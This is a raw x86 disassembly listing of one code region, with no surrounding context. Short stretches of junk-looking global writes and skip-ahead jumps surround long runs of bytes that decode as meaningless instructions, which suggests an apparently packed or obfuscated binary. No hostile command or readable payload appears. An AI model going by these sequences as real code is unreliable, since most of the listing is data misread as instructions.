  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433693,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x433667,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433693,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43360f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43369b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43361b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x4336d3,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0x26ec885f
  406b85:	mov    eax,0x7e7e3b02
  406b8a:	mov    esp,0xd87e7e7f
  406b8f:	adc    BYTE PTR [ecx-0x1dd8a390],dl
  406b95:	adc    esi,esp
  406b97:	mov    bh,0xcd
  406b99:	xchg   ebx,eax
  406b9a:	add    edx,eax
  406b9c:	xchg   ebx,eax
  406b9d:	(bad)
  406ba1:	stos   DWORD PTR es:[edi],eax
  406ba2:	push   ebx
  406ba3:	into   
  406ba4:	out    0xeb,eax
  406ba6:	pop    ss
  406ba7:	out    dx,al
  406ba8:	mov    ah,BYTE PTR [esi+0x51]
  406bab:	bound  edi,QWORD PTR [ecx]
  406bad:	scas   eax,DWORD PTR es:[edi]
  406bae:	in     al,0xe
  406bb0:	jmp    0x4828:0xda6a29f7
  406bb7:	add    ebx,ecx
  406bb9:	and    BYTE PTR [edi-0x359c98f4],bl
  406bbf:	ret    
  406bc0:	sub    eax,0xf940af95
  406bc5:	data16 fadd QWORD PTR [eax+0x76c4566c]
  406bcc:	xchg   edi,eax
  406bcd:	dec    DWORD PTR [esi]
  406bcf:	rol    BYTE PTR [eax-0x20beb6f0],0x90
  406bd6:	idiv   DWORD PTR [edi]
  406bd8:	das    
  406bd9:	fwait
  406bda:	lods   eax,DWORD PTR ds:[esi]
  406bdb:	push   ss
  406bdc:	add    ebx,DWORD PTR [ebx+0x3bfa2938]
  406be2:	xchg   ebx,eax
  406be3:	cs call 0xe97f:0x9206ed8a
  406beb:	jmp    0xc54a:0xa371bf8a
  406bf2:	mov    ebx,0x53f59b7d
  406bf7:	mov    edi,0xf07e8d3f
  406bfc:	xchg   ebp,eax
  406bfd:	call   0x4350920c
  406c02:	test   al,0xb6
  406c04:	sbb    BYTE PTR [eax+0xbcd0273],al
  406c0a:	pop    ecx
  406c0b:	repz mov dh,0x0
  406c0e:	dec    ebp
  406c0f:	xor    dl,dh
  406c11:	cmp    al,BYTE PTR [ebx+0x3f]
  406c14:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  406c16:	out    0x41,eax
  406c18:	xor    ecx,ebp
  406c1a:	hlt    
  406c1b:	jp     0x406c4f
  406c1d:	imul   ecx,DWORD PTR [edi],0xd7a6dd5b
  406c23:	or     edx,DWORD PTR [edi]
  406c25:	out    dx,al
  406c26:	jecxz  0x406c86
  406c28:	in     eax,dx
  406c29:	in     al,dx
  406c2a:	sbb    BYTE PTR [ebp-0x4a78c040],al
  406c30:	jecxz  0x406c24
  406c32:	jp     0x406c82
  406c34:	gs into 
  406c36:	dec    edx
  406c38:	fbld   TBYTE PTR [ecx]
  406c3a:	pushf  
  406c3b:	pop    ebp
  406c3c:	aas    
  406c3d:	add    BYTE PTR [ebp+0xac2404b],cl
  406c43:	add    ah,BYTE PTR [eax+0x7fa17c4]
  406c49:	js     0x406c2e
  406c4b:	das    
  406c4c:	(bad)  
  406c4e:	fcmovne st,st(7)
  406c50:	sbb    DWORD PTR [edx+0x2a143128],0xffffffb0
  406c57:	fild   QWORD PTR [esi-0x35]
  406c5a:	lods   al,BYTE PTR ds:[esi]
  406c5b:	int3   
  406c5c:	ins    BYTE PTR es:[edi],dx
  406c5d:	sbb    eax,0x5e920821
  406c62:	daa    
  406c63:	add    BYTE PTR [esi+0x56],0xc0
  406c67:	mov    eax,cs:0x48e61bd5
  406c6d:	jae    0x406ca7
  406c6f:	stos   BYTE PTR es:[edi],al
  406c70:	sbb    al,0x3
  406c72:	jmp    0x4f898bb4
  406c77:	paddq  xmm7,xmm3
  406c7b:	ja     0x406caf
  406c7d:	ins    DWORD PTR es:[edi],dx
  406c7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c7f:	test   BYTE PTR [eax+0xe],ah
  406c82:	mov    BYTE PTR [ebp+0x2b2d3dc1],bh
  406c88:	ror    DWORD PTR [ecx+edi*4+0x4e],1
  406c8c:	inc    esp
  406c8d:	mov    eax,ds:0x905c85f9
  406c92:	lods   al,BYTE PTR ds:[esi]
  406c93:	dec    ecx
  406c94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c95:	add    eax,0x411b30ce
  406c9a:	rol    DWORD PTR [ebx+0x2ec37a36],1
  406ca0:	arpl   WORD PTR [ebp-0x68],bp
  406ca3:	and    BYTE PTR [eax],dl
  406ca5:	lods   al,BYTE PTR ds:[esi]
  406ca6:	inc    eax
  406ca7:	sbb    esp,DWORD PTR [ecx+eax*8-0x5cde4740]
  406cae:	ret    
  406caf:	test   eax,0xa6c53
  406cb4:	inc    edi
  406cb5:	mov    bl,0x4
  406cb7:	cmp    ecx,DWORD PTR [edi-0x301377e4]
  406cbd:	(bad)  
  406cbe:	fbstp  TBYTE PTR [esi+ebp*8-0x5f]
  406cc2:	pop    esp
  406cc3:	pop    ebp
  406cc4:	push   ebp
  406cc5:	pop    edx
  406cc6:	xchg   DWORD PTR [ebx-0x28],eax
  406cc9:	cmp    BYTE PTR [ecx-0x42b83e31],bl
  406ccf:	nop
  406cd0:	ins    BYTE PTR es:[edi],dx
  406cd1:	jmp    0xab7b93e8
  406cd6:	fdivr  DWORD PTR [esi+0x51d234e6]
  406cdc:	mov    ds:0x34c326aa,eax
  406ce1:	dec    esi
  406ce2:	imul   edx,DWORD PTR [esi+ecx*8+0x5631a4a0],0xad6236e2
  406ced:	pop    edx
  406cee:	cmp    DWORD PTR [ebx+esi*2-0x73],0xffffffe5
  406cf3:	lods   al,BYTE PTR ds:[esi]
  406cf4:	in     al,dx
  406cf5:	sub    eax,0x5c0f5e78
  406cfa:	or     eax,0xb930aec8
  406cff:	pop    ss
  406d00:	ret    0xe0fb
  406d03:	sbb    bl,al
  406d05:	shl    esp,1
  406d07:	loope  0x406cb5
  406d09:	cli    
  406d0a:	pusha  
  406d0b:	sub    BYTE PTR [ebp+esi*2+0x7a89d960],0x74
  406d13:	das    
  406d14:	aad    0xcb
  406d16:	mov    al,0xf2
  406d18:	popa   
  406d19:	dec    esi
  406d1a:	inc    esi
  406d1b:	add    ebx,DWORD PTR [eax-0x55]
  406d1e:	fsub   DWORD PTR [ebx-0x26c3f186]
  406d24:	lds    esi,FWORD PTR [ecx+0x7]
  406d27:	lods   eax,DWORD PTR ds:[esi]
  406d28:	mov    bh,0x4d
  406d2a:	mov    dh,BYTE PTR [eax]
  406d2c:	lds    edx,FWORD PTR [ebx]
  406d2e:	in     eax,dx
  406d2f:	mov    DWORD PTR ds:0x4881b2ed,ebx
  406d35:	dec    edi
  406d36:	pop    esi
  406d37:	xchg   DWORD PTR [esp+ebx*4-0x646ca036],edx
  406d3e:	and    ebx,DWORD PTR [eax]
  406d40:	jmp    0xa8d5452b
  406d45:	and    esp,DWORD PTR [esi+ebp*4]
  406d48:	mov    edi,0x61b3a7c3
  406d4d:	dec    ebx
  406d4e:	dec    ecx
  406d4f:	jecxz  0x406db7
  406d51:	xor    eax,ecx
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x43372f,0x433613
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x433723,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x433663,0x43360f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0xe9
  406d91:	jbe    0x406ddb
  406d93:	xor    DWORD PTR [eax+0x38],eax
  406d96:	jle    0x406e16
  406d98:	mov    esp,0x8c7e7e7f
  406d9d:	(bad)  
  406d9e:	aad    0xf5
  406da0:	mov    al,0x26
  406da2:	cmp    eax,0x6e8c8010
  406da7:	dec    ebp
  406da8:	pop    edx
  406da9:	fld    st(6)
  406dab:	int3   
  406dac:	sbb    eax,0x80c2a55
  406db1:	inc    eax
  406db2:	sbb    ecx,esi
  406db4:	dec    ecx
  406db5:	mov    eax,0x12e389f2
  406dba:	pop    ds
  406dbb:	dec    esi
  406dbc:	mov    al,ds:0xa77ebb10
  406dc1:	inc    esp
  406dc2:	lds    ebp,FWORD PTR [ecx+0x2b6d70a9]
  406dc8:	push   esi
  406dc9:	sub    dh,BYTE PTR [ecx-0x48]
  406dcc:	cmc    
  406dcd:	iret   
  406dce:	pop    DWORD PTR [esi+edi*4+0x7a]
  406dd2:	addr16 loop 0x406dd9
  406dd5:	pop    esp
  406dd6:	jnp    0x406e13
  406dd8:	mov    dl,ah
  406dda:	mov    esi,0xecbf7b4e
  406ddf:	cmp    al,0x4b
  406de1:	in     al,0x40
  406de3:	xchg   ecx,eax
  406de4:	div    DWORD PTR [ecx+0x2]
  406de7:	pop    esp
  406de8:	es out dx,eax
  406dea:	inc    ebp
  406deb:	sub    BYTE PTR [esi],ah
  406ded:	lock add dl,ch
  406df0:	gs mov es,edx
  406df3:	or     ch,BYTE PTR [edx-0x3c]
  406df6:	mov    gs,WORD PTR [ebx+0x27e7664f]
  406dfc:	rcr    DWORD PTR [ecx+0x7407b54d],0xb5
  406e03:	(bad)  
  406e04:	(bad)  
  406e05:	loopne 0x406dca
  406e07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e08:	lods   eax,DWORD PTR ds:[esi]
  406e09:	sbb    DWORD PTR [ecx-0x216f7342],ebx
  406e0f:	mov    esp,0xfa6dd08f
  406e14:	adc    DWORD PTR [eax+0x7b54c083],esp
  406e1a:	push   edx
  406e1b:	sub    al,BYTE PTR [ecx+ebp*2]
  406e1e:	push   edi
  406e1f:	push   esp
  406e20:	mov    ds:0x57f01093,eax
  406e25:	icebp  
  406e26:	scas   eax,DWORD PTR es:[edi]
  406e27:	addr16 pop ebx
  406e29:	jno    0x406e0c
  406e2b:	stc    
  406e2c:	in     al,0xbf
  406e2e:	mov    esi,0x1c75c456
  406e33:	es sti 
  406e35:	into   
  406e36:	or     edx,0x6afab491
  406e3c:	loop   0x406e8c
  406e3e:	push   ecx
  406e3f:	retf   0xfb0c
  406e42:	ja     0x406e88
  406e44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e45:	cmp    BYTE PTR [eax-0x45],cl
  406e48:	jg     0x406df6
  406e4a:	xor    al,0xa5
  406e4c:	icebp  
  406e4d:	retf   0xecb0
  406e50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e51:	push   0x7da10b65
  406e56:	cld    
  406e57:	adc    esp,edx
  406e59:	or     ch,BYTE PTR [edx+0x50]
  406e5c:	cmp    ah,BYTE PTR [eax]
  406e5e:	aaa    
  406e5f:	mov    eax,0x6a60db0d
  406e64:	test   BYTE PTR [ebx+eiz*1-0x275ed5f3],al
  406e6b:	enter  0x87d4,0xd9
  406e6f:	lods   al,BYTE PTR ds:[esi]
  406e70:	jecxz  0x406eaf
  406e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e73:	jae    0x406e79
  406e75:	sub    eax,0x93b1587d
  406e7a:	jge    0x406e16
  406e7c:	ret    0x6671
  406e7f:	dec    ecx
  406e80:	jbe    0x406e29
  406e82:	xor    eax,0x794d04a2
  406e87:	mov    edx,0xb176c2d8
  406e8c:	sub    al,0x5a
  406e8e:	shr    BYTE PTR [ebx+0x49],cl
  406e91:	mov    ecx,0xaf565db9
  406e96:	inc    edx
  406e97:	pusha  
  406e98:	push   cs
  406e99:	mov    ah,0x3b
  406e9b:	pop    ds
  406e9c:	xor    ah,BYTE PTR [edx+0x4b923700]
  406ea2:	jmp    0xefee0f56
  406ea7:	je     0x406edc
  406ea9:	outs   dx,BYTE PTR ds:[esi]
  406eaa:	mov    al,0x33
  406eac:	cs cs pop ds
  406eaf:	test   BYTE PTR [edi],0x30
  406eb2:	fld    DWORD PTR [edi]
  406eb4:	cmovno edi,edx
  406eb7:	retf   
  406eb8:	int    0xa9
  406eba:	aad    0x74
  406ebc:	add    al,0x13
  406ebe:	add    ecx,DWORD PTR [eax]
  406ec0:	fadd   QWORD PTR [edx+0x6]
  406ec3:	fimul  DWORD PTR [esi]
  406ec5:	sbb    BYTE PTR [edx-0x420b6c8c],bl
  406ecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ecc:	fstp   DWORD PTR [esi]
  406ece:	sub    BYTE PTR [ecx],dl
  406ed0:	shr    DWORD PTR [esi],0x3e
  406ed3:	push   esi
  406ed4:	xchg   ecx,eax
  406ed5:	cmp    DWORD PTR [edi-0x28f6838c],eax
  406edb:	xor    BYTE PTR [edx],ah
  406edd:	push   esi
  406ede:	mov    ss,WORD PTR [ecx+ebp*2]
  406ee1:	ds imul edx,ecx,0xb96cec99
  406ee8:	xchg   BYTE PTR [ebp+0xf],ch
  406eeb:	stc    
  406eec:	clc    
  406eed:	aas    
  406eee:	aas    
  406eef:	dec    ebx
  406ef0:	mov    bl,0x15
  406ef2:	pop    ds
  406ef3:	adc    al,0xfa
  406ef5:	mov    al,0x2d
  406ef7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ef8:	adc    eax,0x33268eda
  406efd:	pop    esp
  406efe:	push   edx
  406eff:	fst    DWORD PTR [ebx+0x4e8bc162]
  406f05:	sub    al,0x84
  406f07:	aam    0x8c
  406f09:	ja     0x406ec6
  406f0b:	and    bh,ah
  406f0d:	pusha  
  406f0e:	test   eax,0xd00e8f46
  406f13:	adc    eax,0xb736692d
  406f18:	ret    0x88bb
  406f1b:	and    cl,al
  406f1d:	xchg   edi,eax
  406f1e:	ins    BYTE PTR es:[edi],dx
  406f1f:	dec    edx
  406f20:	sti    
  406f21:	cld    
  406f22:	ret    
  406f23:	or     DWORD PTR [esp+esi*4],ebx
  406f26:	push   0x74
  406f28:	repnz mov BYTE PTR [edi-0x30d7068c],dh
  406f2f:	leave  
  406f30:	call   0x23a3:0xb01c9928
  406f37:	mov    BYTE PTR [ecx-0x58d6eeed],dl
  406f3d:	inc    eax
  406f3e:	jbe    0x406f71
  406f40:	sub    BYTE PTR [edi-0x1b],bl
  406f43:	add    BYTE PTR [ecx],dl
  406f45:	lods   al,BYTE PTR ds:[esi]
  406f46:	test   ax,0xc67a
  406f4a:	jae    0x406f05
  406f4c:	call   0x2f3c:0x31976e2c
  406f53:	xchg   edx,eax
  406f54:	lods   al,BYTE PTR ds:[esi]
  406f55:	add    dl,cl
  406f57:	dec    esi
  406f58:	out    0x7e,eax
  406f5a:	push   eax
  406f5b:	xchg   edi,eax
  406f5c:	cmp    BYTE PTR [edx],ch
  406f5e:	not    eax
  406f60:	and    DWORD PTR ds:0x43360f,0x433653
  406f6a:	and    eax,DWORD PTR [ecx]
  406f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  406f6f:	mov    DWORD PTR [ecx],eax
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0x7db27e3a
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0x97e7e7f
  406f9f:	fbstp  TBYTE PTR [ebx+0x7a]
  406fa2:	lock jno 0x406f50
  406fa5:	out    dx,eax
  406fa6:	loopne 0x406f64
  406fa8:	jmp    0x66b2:0xb599954a
  406faf:	mov    ah,0x3a
  406fb1:	dec    eax
  406fb2:	sbb    DWORD PTR [edx-0x32],eax
  406fb5:	push   esp
  406fb6:	stos   BYTE PTR es:[edi],al
  406fb7:	add    DWORD PTR [ecx+0x78],eax
  406fba:	mov    bl,0x64
  406fbc:	jecxz  0x406fcd
  406fbe:	out    dx,al
  406fbf:	xacquire xchg BYTE PTR [eax+0x12533b7e],al
  406fc6:	enter  0xc613,0xf9
  406fca:	add    DWORD PTR [edx-0x6598640a],0x8c6c7fe9
  406fd4:	aad    0x8b
  406fd6:	sub    ecx,DWORD PTR [edi]
  406fd8:	loopne 0x406ffd
  406fda:	mov    ecx,DWORD PTR [edi-0x455bc53]
  406fe0:	nop
  406fe1:	or     al,0x86
  406fe3:	clc    
  406fe4:	(bad)  
  406fe5:	push   ds
  406fe6:	jge    0x406ff1
  406fe8:	bound  ecx,QWORD PTR [ebx-0x64f36c0a]
  406fee:	leave  
  406fef:	call   0x1156882e
  406ff4:	mov    cl,0x95
  406ff6:	adc    al,0xcd
  406ff8:	adc    edi,DWORD PTR fs:[ebx+0x46]
  406ffc:	loope  0x406fee
  406ffe:	xchg   cl,al
  407000:	mov    esp,0x73c07a0f
  407005:	jle    0x40700f
  407007:	and    al,0xf4
  407009:	pop    esp
  40700a:	jae    0x406fbc
  40700c:	inc    esi
  40700d:	shr    DWORD PTR [ebp+0x55],1
  407010:	inc    esp
  407011:	loope  0x407032
  407013:	out    dx,al
  407014:	data16 cmp al,0x84
  407017:	ja     0x406faa
  407019:	mov    ecx,0xb9ddeb6d
  40701e:	pop    ebx
  40701f:	sbb    eax,0x98eb8c55
  407024:	call   0x3cb0:0x498153e9
  40702b:	xchg   edx,eax
  40702c:	push   ebx
  40702d:	int3   
  40702e:	push   ebx
  40702f:	das    
  407030:	dec    eax
  407031:	(bad)  
  407032:	cmp    al,0x33
  407034:	retf   
  407035:	rol    ah,cl
  407037:	sub    BYTE PTR [edi+eiz*2],bl
  40703a:	xchg   edi,eax
  40703b:	cwde   
  40703c:	xchg   ch,bh
  40703e:	pop    ebx
  40703f:	in     eax,dx
  407040:	pop    edi
  407041:	mov    DWORD PTR [ebp+0x1f],ebx
  407044:	mov    ds:0x437a783,al
  407049:	sahf   
  40704a:	fld    DWORD PTR [ecx+0x37]
  40704d:	mov    WORD PTR [ecx+0x39d9bcca],gs
  407053:	xor    DWORD PTR [ecx-0x40532332],edx
  407059:	aam    0xce
  40705b:	cmp    al,0x90
  40705d:	ror    DWORD PTR [esi-0x3ffa5985],1
  407063:	rol    DWORD PTR [edi+0x68660306],0x9c
  40706a:	mov    al,0xad
  40706c:	push   ebp
  40706d:	sbb    BYTE PTR [edi+0x1f],al
  407070:	mov    edi,0x77a6ba37
  407075:	xchg   esp,eax
  407076:	nop
  407077:	(bad)  
  407078:	cdq    
  407079:	popf   
  40707a:	stc    
  40707b:	mov    dh,0xa8
  40707d:	in     eax,dx
  40707e:	jns    0x4070cb
  407080:	in     eax,0xf6
  407082:	aad    0x4c
  407084:	iret   
  407085:	pop    ecx
  407086:	add    esp,DWORD PTR [esi-0x7d]
  407089:	sbb    al,0x97
  40708b:	bound  eax,QWORD PTR [edi+0x3134d91d]
  407091:	(bad)  
  407092:	pop    ebp
  407093:	pop    eax
  407094:	mov    eax,ds:0xa2ad2464
  407099:	sahf   
  40709a:	icebp  
  40709b:	(bad)  
  40709c:	dec    esp
  40709d:	not    edx
  40709f:	add    DWORD PTR [ebx],esi
  4070a1:	stos   DWORD PTR es:[edi],eax
  4070a2:	jge    0x40707f
  4070a4:	jl     0x40704d
  4070a6:	fnstcw WORD PTR [ecx-0x63f5d87b]
  4070ac:	add    bl,bl
  4070ae:	dec    edx
  4070af:	push   0x355defb4
  4070b4:	mov    ds:0xa5825b73,al
  4070b9:	lahf   
  4070ba:	inc    esp
  4070bb:	(bad)  
  4070bc:	sbb    bh,BYTE PTR [eax+ebp*4+0x1abce3b0]
  4070c3:	adc    ah,0xfa
  4070c6:	mov    eax,0xc92fa56a
  4070cb:	pop    ebx
  4070cc:	pop    ss
  4070cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070ce:	icebp  
  4070cf:	mov    eax,ds:0xc2152249
  4070d4:	into   
  4070d5:	ds sahf 
  4070d7:	sub    BYTE PTR [eax+0x69dcc913],0x2
  4070de:	sbb    BYTE PTR [esp+edi*4+0x523379f3],bh
  4070e5:	ret    
  4070e6:	push   eax
  4070e7:	in     al,0xb2
  4070e9:	xlat   BYTE PTR ds:[ebx]
  4070ea:	dec    ebx
  4070eb:	xchg   ecx,eax
  4070ec:	ds nop
  4070ee:	pop    edx
  4070ef:	(bad)  
  4070f0:	xor    al,0x58
  4070f2:	(bad)  
  4070f3:	pop    eax
  4070f4:	adc    edi,DWORD PTR [edi+eax*4]
  4070f7:	inc    ebx
  4070f8:	or     al,0x76
  4070fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070fb:	xor    BYTE PTR [edx+ebp*1+0x71],0x98
  407100:	hlt    
  407101:	mov    ds:0xfb7ac7db,eax
  407106:	hlt    
  407107:	sub    DWORD PTR [edi+eiz*1+0x4a239c89],ebx
  40710e:	das    
  40710f:	inc    edi
  407110:	mov    bl,bl
  407112:	scas   eax,DWORD PTR es:[edi]
  407113:	mov    dh,0xe6
  407115:	leave  
  407116:	mov    ebx,0x9ef9e7b9
  40711b:	fisttp WORD PTR [ecx+0x3ee487f6]
  407121:	stos   BYTE PTR es:[edi],al
  407122:	in     eax,0xa7
  407124:	shl    ebp,cl
  407126:	jmp    0x407113
  407128:	or     al,0x96
  40712a:	fstp   QWORD PTR [edx-0x7cdaf58]
  407130:	mov    dh,0xcf
  407132:	out    0xff,al
  407134:	and    eax,0x38fc22cd
  407139:	in     eax,0xd5
  40713b:	adc    BYTE PTR [ebx],al
  40713d:	sub    eax,0x42100d38
  407142:	cwde   
  407143:	pop    ss
  407144:	enter  0xdfbb,0xc7
  407148:	scas   eax,DWORD PTR es:[edi]
  407149:	mov    WORD PTR [edx-0x7c],?
  40714c:	jge    0x40714f
  40714e:	xchg   ebx,eax
  40714f:	sub    BYTE PTR [edi],bh
  407151:	loope  0x40715f
  407153:	push   esp
  407154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407156:	dec    edx
  407157:	ss out dx,eax
  407159:	hlt    
  40715a:	push   0xffffffc9
  40715c:	xor    BYTE PTR [esi+edi*8],dh
  40715f:	loopne 0x407160
  407161:	jne    0x40716b
  407163:	call   0x407353
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	push   0xffffff88
  40717d:	sub    edx,0xffffffcc
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0xed7e7e7f
  407188:	lds    eax,FWORD PTR [edi]
  40718a:	gs cmp al,0x2f
  40718d:	mov    ch,bl
  40718f:	fdiv   st,st(0)
  407191:	xchg   ecx,eax
  407192:	dec    DWORD PTR [esi-0x1d]
  407195:	shr    BYTE PTR [ebx],1
  407197:	fadd   DWORD PTR [ebp+0x197eadac]
  40719d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40719e:	mov    al,ds:0xbf83ab52
  4071a3:	cmp    cl,ch
  4071a5:	loopne 0x407192
  4071a7:	cli    
  4071a8:	pop    ds
  4071a9:	int    0xa8
  4071ab:	sahf   
  4071ac:	mov    dl,0xd7
  4071ae:	sub    esp,edx
  4071b0:	cdq    
  4071b1:	das    
  4071b2:	add    DWORD PTR [esi-0x4c1e7289],0xffffffc1
  4071b9:	cmp    ecx,DWORD PTR [edi+0x11fc7897]
  4071bf:	xor    DWORD PTR [ebp-0x68],edi
  4071c2:	lods   eax,DWORD PTR ds:[esi]
  4071c3:	xchg   esi,eax
  4071c4:	fwait
  4071c5:	jns    0x4071e2
  4071c7:	dec    eax
  4071c8:	pusha  
  4071c9:	mov    ebx,0x17c40080
  4071ce:	xchg   ebp,eax
  4071cf:	mov    esi,0xf02112ae
  4071d4:	pop    esi
  4071d5:	or     eax,0xe664d49e
  4071da:	lea    esp,[ecx]
  4071dc:	enter  0x7566,0x1a
  4071e0:	xor    eax,0xfaacdc66
  4071e5:	popa   
  4071e6:	or     dl,BYTE PTR [esi-0x39]
  4071e9:	mov    ds:0x4d9565c3,eax
  4071ee:	clc    
  4071ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071f0:	(bad)  
  4071f1:	push   edi
  4071f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071f3:	sub    eax,0x89f2ba00
  4071f8:	mov    al,0xe8
  4071fb:	popa   
  4071fc:	pop    ds
  4071fd:	in     al,dx
  4071fe:	addr16 xchg edi,eax
  407200:	xchg   edx,esi
  407202:	cli    
  407203:	cs leave 
  407205:	push   cs
  407206:	enter  0xfd73,0xc1
  40720a:	loopne 0x407211
  40720c:	jl     0x40726e
  40720e:	lods   al,BYTE PTR ds:[esi]
  40720f:	int    0x8e
  407211:	xchg   edx,eax
  407212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407213:	ja     0x4071d5
  407215:	outs   dx,DWORD PTR ds:[esi]
  407216:	pop    ds
  407217:	cmp    ebx,DWORD PTR [edx]
  407219:	scas   eax,DWORD PTR es:[edi]
  40721a:	mov    ds:0xfd02ce79,al
  40721f:	nop
  407220:	fcom   QWORD PTR [edi-0x7f0c0e78]
  407226:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407227:	ror    DWORD PTR [ebp+0x52],0x78
  40722b:	mov    ecx,0xc901197e
  407230:	aas    
  407231:	dec    edx
  407232:	stos   BYTE PTR es:[edi],al
  407233:	mov    ebx,0x76d5c523
  407238:	or     dl,BYTE PTR [ebx+edx*1-0x52558e06]
  40723f:	fstp   QWORD PTR [eax]
  407241:	inc    edx
  407242:	test   eax,0x999d2a51
  407247:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407248:	adc    cl,BYTE PTR [ecx]
  40724a:	push   es
  40724b:	inc    esp
  40724c:	lods   al,BYTE PTR ds:[esi]
  40724d:	pop    esp
  40724e:	and    al,0x58
  407250:	ins    BYTE PTR es:[edi],dx
  407251:	loop   0x407261
  407253:	jbe    0x407240
  407255:	lds    ebx,FWORD PTR [edx+0x16106c5a]
  40725b:	jns    0x407200
  40725d:	dec    ebp
  40725e:	addr16 cwde 
  407260:	cmp    eax,0xbd98b16b
  407265:	adc    al,0x33
  407267:	add    eax,0xba33a5f3
  40726c:	call   FWORD PTR [edx+eax*2]
  40726f:	cmp    al,0xba
  407271:	lods   eax,DWORD PTR ds:[esi]
  407272:	sar    BYTE PTR [ebx+0x33a0da3e],0x3
  407279:	sub    BYTE PTR [edi+0x7bea96f3],cl
  40727f:	add    DWORD PTR [eax-0xe8fe281],edi
  407285:	xor    eax,0x9674ce2
  40728a:	loope  0x40720d
  40728c:	sub    ebp,0xfffffff7
  40728f:	mov    ch,0xea
  407291:	fdivr  DWORD PTR [esi+0x309335fa]
  407297:	lods   al,BYTE PTR ds:[esi]
  407298:	mov    ch,0x6a
  40729a:	push   cs
  40729b:	pop    ebx
  40729c:	or     esp,ebx
  40729e:	and    al,0x57
  4072a0:	in     eax,0xc7
  4072a2:	mov    al,0x22
  4072a4:	jno    0x407230
  4072a6:	sbb    eax,0xb76618c1
  4072ab:	cwde   
  4072ac:	push   ss
  4072ad:	sti    
  4072ae:	mov    bh,0xcd
  4072b0:	or     edx,DWORD PTR [esp+ecx*2]
  4072b3:	loopne 0x4072c1
  4072b5:	mov    esp,0x62c35308
  4072ba:	jle    0x40723e
  4072bc:	cld    
  4072bd:	test   al,0x68
  4072bf:	dec    ebp
  4072c0:	xor    al,al
  4072c2:	xchg   edx,eax
  4072c3:	jp     0x407313
  4072c5:	and    DWORD PTR [edx+0x47],ebp
  4072c8:	cmp    DWORD PTR [esi],0x6e
  4072cb:	mov    esp,0x1da2c4ad
  4072d0:	xchg   edx,eax
  4072d1:	std    
  4072d2:	dec    esi
  4072d3:	jle    0x407264
  4072d5:	in     eax,0xdc
  4072d7:	inc    edx
  4072d8:	loop   0x407309
  4072da:	ret    0x3be4
  4072dd:	xchg   ecx,eax
  4072de:	push   edx
  4072df:	mov    bl,0xb4
  4072e1:	repz inc ebp
  4072e3:	add    eax,0xe8182398
  4072e8:	adc    BYTE PTR [esi-0x6b30fdd9],0x18
  4072ef:	aaa    
  4072f0:	and    esi,esp
  4072f2:	jmp    0x407357
  4072f4:	cmp    edx,DWORD PTR [ebx-0x467eaf7d]
  4072fa:	xor    eax,0x92df05a7
  4072ff:	adc    eax,0xf15b5d27
  407304:	cmp    ebx,edi
  407306:	jmp    0x9386:0x7e9d739e
